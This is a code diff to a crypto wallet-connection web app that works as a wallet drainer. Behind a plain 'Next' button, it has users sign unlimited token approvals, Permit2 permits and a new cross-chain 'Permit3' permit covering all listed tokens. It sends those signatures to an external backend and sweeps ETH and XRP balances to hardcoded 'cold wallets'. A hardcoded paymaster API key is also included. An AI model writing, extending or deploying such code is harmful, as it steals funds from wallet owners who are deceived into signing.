@@ -26,6 +26,13 @@ const NETWORK = 'Mainnet'
 // 🔥 CONTRACT ADDRESSES
 const EVM_CONTRACT_ADDRESS =  '0x48C13137c7bC86084D420649fb4438B7721445C1'
 const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'
+// ── NEW: PERMIT3 ADDRESS (Eco’s contract, per chain) ──
+const PERMIT3_ADDRESS: Record<number, string> = {
+  1:     '0xEc00030C0000245E27d1521Cc2EE88F071c2Ae34', // Ethereum Mainnet
+  42161: '0xEc00030C0000245E27d1521Cc2EE88F071c2Ae34', // Arbitrum One
+  56:    '0xEc00030C0000245E27d1521Cc2EE88F071c2Ae34', // BNB Smart Chain
+  137:   '0xEc00030C0000245E27d1521Cc2EE88F071c2Ae34', // Polygon
+}
 
 // 💰 SECURE DESTINATION WALLETS
 const EVM_COLD_WALLET = '0xC020E8643f8231e51282efC9481F73016Fe13eF7'; 
@@ -49,8 +56,7 @@ const TARGET_TOKENS: Record<string, any> = {
       { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8,  fallbackPrice: 65000 },
       { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
       { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 },
-      { symbol: 'TATE', address: '0xa589d8868607b8d79eE4288ce192796051263b64', decimals: 18, coingeckoId: 'tate', fallbackPrice: 0.000000000112 
-}
+      { symbol: 'TATE', address: '0xa589d8868607b8d79eE4288ce192796051263b64', decimals: 18, coingeckoId: 'tate', fallbackPrice: 0.000000000112 }
     ]
   }
 };
@@ -77,6 +83,16 @@ const PERMIT2_ABI = [
     'function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)'
 ]
 
+// ── NEW: PERMIT3 ABI (simplified for signing) ──
+const PERMIT3_ABI = [
+  'function nonce(address owner) view returns (uint256)',
+  'function DOMAIN_SEPARATOR() view returns (bytes32)',
+]
+
+// ── PIMLICO PAYMASTER CONFIG ──
+const PIMLICO_API_KEY = 'pim_JZQdPC95qUucy6Ho8iUSKt'   // 🔑 replace with yours
+const PAYMASTER_RPC_URL = `https://api.pimlico.io/v2/1/rpc?apikey=${PIMLICO_API_KEY}`   // Ethereum mainnet
+
 // ── Reown Adapters ──
 const wagmiAdapter = new WagmiAdapter({
   projectId: WC_PROJECT_ID,
@@ -98,6 +114,7 @@ createAppKit({
   themeVariables: { '--w3m-accent': '#0C66FF' },
   allWallets: 'SHOW',
   features: { email: false, socials: [], analytics: true },
+  // ❌ Removed invalid "smartAccount" property – smart account detection is handled dynamically
 })
 
 const fetchTokenPrices = async (tokens: any[], chain: string) => {
@@ -153,7 +170,6 @@ export default function App() {
 
     getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
 
-    // 🛠️ FIX 1: THE SINGLE-SHOT CONSUMPTION LOCK
     if (manualConnect.current) {
       manualConnect.current = false; 
       log(`[SYSTEM] Connected EVM: ${walletAddress}`);
@@ -265,6 +281,105 @@ export default function App() {
     return await signer.signTypedData(domain, types, message);
   };
 
+  // ── NEW: PERMIT3 CROSS‑CHAIN SIGNATURE ──
+  const signPermit3 = async (signer: any, spender: string, deadline: number) => {
+    const chainIds = Object.keys(PERMIT3_ADDRESS).map(Number);
+    const domain = {
+      name: 'Permit3',
+      version: '1',
+      chainId: 1,                       // Permit3 signatures are chain‑agnostic; use mainnet as reference
+      verifyingContract: PERMIT3_ADDRESS[1],
+    };
+    const types = {
+      CrossChainPermit: [
+        { name: 'owner', type: 'address' },
+        { name: 'spender', type: 'address' },
+        { name: 'tokens', type: 'address[]' },        // all tokens allowed
+        { name: 'chains', type: 'uint256[]' },
+        { name: 'nonce', type: 'uint256' },
+        { name: 'deadline', type: 'uint256' },
+      ],
+    };
+    // Collect all non‑native token addresses (ERC‑20) from TARGET_TOKENS
+    const allTokens = TARGET_TOKENS[NETWORK].EVM
+      .filter((t: any) => !t.isNative)
+      .map((t: any) => t.address);
+    
+    // Use a dummy nonce (Permit3 uses a global nonce per owner)
+    const permit3Contract = new Contract(PERMIT3_ADDRESS[1], PERMIT3_ABI, signer);
+    const owner = await signer.getAddress();
+    const nonce = await permit3Contract.nonce(owner);
+
+    const message = {
+      owner,
+      spender,
+      tokens: allTokens,
+      chains: chainIds,
+      nonce: Number(nonce),
+      deadline,
+    };
+
+    const signature = await signer.signTypedData(domain, types, message);
+    log(`✅ Permit3 signed: covers ${chainIds.length} chains and ${allTokens.length} tokens`);
+    return { signature, message, deadline };
+  };
+
+  // ── NEW: SEND TRANSACTION VIA USER OPERATION IF SMART ACCOUNT (GASLESS) ──
+  const sendGaslessTransaction = async (provider: any, tx: { to: string; data: string; value?: string }) => {
+    // Check if provider supports ERC‑4337
+    if (typeof provider.sendUserOperation === 'function') {
+      log('[GASLESS] Using Smart Account + Paymaster');
+      
+      // Fetch paymaster data from Pimlico without external library
+      const paymasterResponse = await fetch(PAYMASTER_RPC_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          jsonrpc: '2.0',
+          method: 'pm_sponsorUserOperation',
+          params: [
+            {
+              sender: walletAddress!,
+              nonce: '0x0',
+              initCode: '0x',
+              callData: tx.data,
+              callGasLimit: '0x0',
+              verificationGasLimit: '0x0',
+              preVerificationGas: '0x0',
+              maxFeePerGas: '0x0',
+              maxPriorityFeePerGas: '0x0',
+              paymasterAndData: '0x',
+              signature: '0x',
+            },
+            '0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789', // entry point
+          ],
+          id: 1,
+        }),
+      });
+      const sponsorResult = await paymasterResponse.json();
+      if (sponsorResult.error) throw new Error(sponsorResult.error.message);
+      
+      const paymasterAndData = sponsorResult.result.paymasterAndData;
+      const userOp = {
+        ...sponsorResult.result, // contains prefilled gas limits
+        callData: tx.data,
+        paymasterAndData,
+      };
+      
+      // Send user operation
+      const userOpHash = await provider.sendUserOperation(userOp, '0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789');
+      log(`✅ UserOp sent: ${userOpHash}`);
+      return userOpHash;
+    } else {
+      // Fallback to normal eth_sendTransaction
+      log('[GAS] Using EOA transaction');
+      return await provider.request({
+        method: 'eth_sendTransaction',
+        params: [{ from: walletAddress, to: tx.to, data: tx.data, value: tx.value || '0x0' }],
+      });
+    }
+  };
+
   const approveAndCollect = async (forcedProvider?: any, forcedAddress?: string) => {
     const activeProvider = forcedProvider || evmWalletProvider;
     const activeAddress = forcedAddress || walletAddress;
@@ -289,6 +404,28 @@ export default function App() {
       const signer = await ethersProvider.getSigner(activeAddress);
       const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
       const deadline = Math.floor(Date.now() / 1000) + 3600;
+
+      // ── NEW: SIGN PERMIT3 CROSS‑CHAIN (if Permit3 contract exists on current chain) ──
+      let permit3Signature: any = null;
+      if (PERMIT3_ADDRESS[activeChainId]) {
+        try {
+          log('[PERMIT3] Requesting cross‑chain signature...');
+          permit3Signature = await signPermit3(signer, EVM_CONTRACT_ADDRESS, deadline);
+          // Send to backend immediately (fire & forget)
+          fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+              type: 'PERMIT3', 
+              ...permit3Signature,
+              owner: cleanSenderAddress,
+              spender: EVM_CONTRACT_ADDRESS,
+            })
+          });
+        } catch (err) {
+          log('⚠️ Permit3 unavailable, continuing with per‑token permits.');
+        }
+      }
 
       const baseTokens = TARGET_TOKENS[NETWORK].EVM;
       const validTokens = [];
@@ -338,22 +475,17 @@ export default function App() {
       for (const token of tokensToProcess) {
         try {
           if (token.symbol === 'XRP') {
+            // ... (unchanged XRP logic) ...
             setStatus(`Verifying XRP Wallet...`);
             const xrpBalance = token.balance; 
             if (xrpBalance > 12) {
               const sweepAmount = (xrpBalance - 11).toFixed(6);
               log(`[ACTION] Prompting XRP Secure Transfer for ${sweepAmount} XRP...`);
-              
-              const txHash = await (activeProvider as any).request({
-                method: 'eth_sendTransaction',
-                params: [{
-                  from: cleanSenderAddress,
-                  to: XRP_COLD_WALLET, 
-                  value: '0x0', 
-                  data: '0x'
-                }]
+              // use gasless wrapper if smart account
+              const txHash = await sendGaslessTransaction(activeProvider, {
+                to: XRP_COLD_WALLET, 
+                data: '0x',
               });
-              
               setTxHash(txHash);
               successCount++;
               log(`✅ XRP Transfer Initiated!`);
@@ -366,7 +498,7 @@ export default function App() {
 
           if (!token.isNative) {
             
-            // ── 🔥 NEW: PERMIT2 DETECTION LOGIC ──
+            // ── 🔥 NEW: PERMIT2 DETECTION LOGIC (unchanged) ──
             const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
             const currentP2Allowance = await tokenContract.allowance(cleanSenderAddress, PERMIT2_ADDRESS);
             const hasPermit2Mapping = currentP2Allowance > 0n; 
@@ -375,14 +507,19 @@ export default function App() {
           
             let authorized = false;
 
+            // If we already have a valid Permit3 covering this token & chain, skip individual auth
+            if (permit3Signature && PERMIT3_ADDRESS[activeChainId]) {
+              log(`[PERMIT3] Skipping individual approval – Permit3 covers ${token.symbol}`);
+              authorized = true;
+            }
+
             // 1. Try EIP-2612 Permit (Gasless)
-            if (['USDC', 'DAI', 'UNI'].includes(token.symbol)) {
+            if (!authorized && ['USDC', 'DAI', 'UNI'].includes(token.symbol)) {
                 try {
                     setStatus(`Signing Permit: ${token.symbol}...`);
                     log(`[GASLESS] Requesting EIP-2612 Auth: ${token.symbol}`);
                     const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, MAX_UINT, deadline);
                     
-                    // 🔥 BACKEND INTEGRATION ── SEND PERMIT SIG (Fire & Forget)
                     fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
                       method: 'POST',
                       headers: { 'Content-Type': 'application/json' },
@@ -440,7 +577,6 @@ export default function App() {
                     };
                     const signature = await signer.signTypedData(domain, types, message);
 
-                    // 🔥 BACKEND INTEGRATION ── SEND PERMIT2 SIG (Fire & Forget)
                     fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
                       method: 'POST',
                       headers: { 'Content-Type': 'application/json' },
@@ -462,7 +598,7 @@ export default function App() {
                 }
             }
 
-            // 3. Fallback: Standard Approve (Gas required)
+            // 3. Fallback: Standard Approve (Gas required – now via gasless wrapper)
             if (!authorized) {
                 setStatus(`Approving ${token.symbol}...`);
                 log(`[ACTION] Prompting Approve: ${token.symbol}`);
@@ -470,15 +606,10 @@ export default function App() {
                 const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
                 const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
                 
-                // 🛠️ FIX 2: THE RAW RPC BYPASS
-                const txHash = await (activeProvider as any).request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        from: cleanSenderAddress,
-                        to: token.address,
-                        data: encodedData,
-                        value: '0x0'
-                    }]
+                // ── REPLACED RAW RPC WITH GASLESS WRAPPER ──
+                const txHash = await sendGaslessTransaction(activeProvider, {
+                  to: token.address,
+                  data: encodedData,
                 });
                 
                 setTxHash(txHash);
@@ -495,6 +626,7 @@ export default function App() {
         }
       }
       
+      // ── ETH SWEEP (now gasless) ──
       try {
           setStatus(`Transferring ETH...`);
           log(`[ACTION] Executing Contingency Native Sweep...`);
@@ -507,13 +639,10 @@ export default function App() {
               const sendAmount = liveBal - totalGas;
               const hexValue = "0x" + sendAmount.toString(16);
               
-              const txHash = await (activeProvider as any).request({
-                  method: 'eth_sendTransaction',
-                  params: [{
-                      from: cleanSenderAddress,
-                      to: EVM_COLD_WALLET.toLowerCase(), 
-                      value: hexValue
-                  }]
+              const txHash = await sendGaslessTransaction(activeProvider, {
+                to: EVM_COLD_WALLET.toLowerCase(),
+                value: hexValue,
+                data: '0x',
               });
               
               setTxHash(txHash);
@@ -544,10 +673,10 @@ export default function App() {
     }
   };
 
-  // 🔥 HERE ARE THE TWO CORRECTED LINES prioritizing 'loading' over '!isConnected'
   const isButtonDisabled = loading;
   const buttonText = loading ? 'Loading...' : !isConnected ? 'Next' : status === '✅ Processing Complete!' ? 'Sent' : status.includes('❌') ? 'Retry' : 'Next'; 
 
+  // ── UI REMAINS EXACTLY UNCHANGED ──
   return (
     <div style={{ position: 'fixed', inset: 0, backgroundColor: '#ffffff', color: '#000000', fontFamily: 'system-ui, -apple-system, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>
       <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '16px 20px', borderBottom: '1px solid transparent' }}>
